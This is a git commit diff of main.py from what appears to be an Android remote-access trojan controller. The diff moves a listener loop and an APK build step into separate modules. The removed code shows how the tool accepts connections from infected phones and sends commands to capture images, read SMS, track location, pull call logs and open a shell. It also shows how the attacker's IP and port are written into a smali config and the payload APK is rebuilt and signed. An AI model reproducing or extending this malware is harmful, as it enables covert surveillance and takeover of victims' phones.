b4f4f7f5c5909008ed653c03a35ecd957cdbd48d
dany_milan <esteban239222@gmail.com>
2020-11-25 20:00:37 -0400

    main nuevo

--- main.py
+++ main.py
@@ -1,5 +1,7 @@
 import socket
 from utils import *
+from shell import *
+from build import *
 import select
 import platform
 import argparse
@@ -46,101 +48,7 @@ else:
 
 
 if args.shell:
-    print("shell")
-    
-    soc = socket.socket() 
-    soc = socket.socket(type=socket.SOCK_STREAM)
-    soc.bind((ip, port))
-    soc.listen(2)
-    #print(Style.BRIGHT+Fore.RED+banner+Fore.RESET)
-    
-    while True:
-        done=False
-        t = threading.Thread(target=animate,args=(" Waiting for Connections ",))
-        t.start()
-        conn, addr = soc.accept()
-        done = True
-        t.join()
-        clear()
-        print(Fore.YELLOW+"Got connection from "+Fore.RED+"".join(str(addr))+Fore.RESET)
-        print(" ")
-        while True:
-            msg = conn.recv(4024).decode("UTF-8")
-            if(msg.strip() == "IMAGE"):
-                getImage(conn)
-            elif("readSMS" in msg.strip()):
-                content = msg.strip().split(" ")
-                data = content[1]
-                readSMS(conn,data)
-            elif(msg.strip() == "SHELL"):
-                shell(conn)
-            elif(msg.strip() == "getLocation"):
-                getLocation(conn)
-            elif(msg.strip() == "stopVideo123"):
-                stopVideo(conn)
-            elif(msg.strip() == "stopAudio"):
-                stopAudio(conn)
-            elif(msg.strip() == "callLogs"):
-                callLogs(conn)
-            elif(msg.strip() == "help"):
-                help()
-            else:
-                print(msg)
-            message_to_send = input(Style.BRIGHT+Fore.CYAN+"Interpreter:/> "+Fore.RESET)+"\n"
-            conn.send(message_to_send.encode("UTF-8"))
-            if message_to_send.strip() == "exit":
-                print(" ")
-                print("Bye")
-                sys.exit()
-            if(message_to_send.strip() == "clear"):clear()
-    
+    shell(ip,port)
 
 if args.build:
-    print("build")
-    '''
-    editor = "Compiled_apk_files"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
-    port = str(port)
-    try:
-        file = open(editor,"r").readlines()
-        #Very much uncertaninity but cant think any other way to do it xD
-        file[16]=file[16][:21]+"\""+ip+"\""+"\n"
-        file[21]=file[21][:21]+"\""+port+"\""+"\n"
-        str_file="".join([str(elem) for elem in file])
-        open(editor,"w").write(str_file)
-    except Exception as e:
-        print(e)
-        sys.exit()
-    java_version = executeCMD("java -version")
-    if java_version.stderr == "":
-        print(Style.BRIGHT+Fore.RED+"\nJava Not Installed"+Fore.RESET)
-    else:
-        print(Style.BRIGHT+Fore.YELLOW+"\nGenerating apk file"+Fore.RESET)
-        if args.output:
-            outFileName = args.output
-        else:
-            outFileName = "karma.apk"
-        done=False
-        t = threading.Thread(target=animate,args=("Building ",))
-        t.start()
-        resOut = executeCMD("java -jar Jar_Files/apktool.jar b Compiled_apk_files  -o "+outFileName)
-        done = True
-        t.join()
-        if not resOut.returncode:
-            print(Style.BRIGHT+Fore.GREEN+"\rSuccessfully apk built "+getpwd(outFileName)+"\n"+Fore.RESET,end="")
-            print(Style.BRIGHT+Fore.YELLOW+"\nSigning the apk"+Fore.RESET)
-            done=False
-            t = threading.Thread(target=animate,args=("Signing ",))
-            t.start()
-            resOut = executeCMD("java -jar Jar_Files/sign.jar "+outFileName+" --override")
-            done = True
-            t.join()
-            if not resOut.returncode:
-                print(Fore.GREEN+"\rSuccessfully signed the apk "+outFileName+Fore.RESET,end="")
-                print(" ")
-            else:
-                print("\r"+resOut.stderr)
-                print(Fore.RED+"Signing Failed"+Fore.RESET)    
-        else:
-            print("\r"+resOut.stderr)
-            print(Fore.RED+"Building Failed"+Fore.RESET)
-    '''
+    build(direc, port, ip)
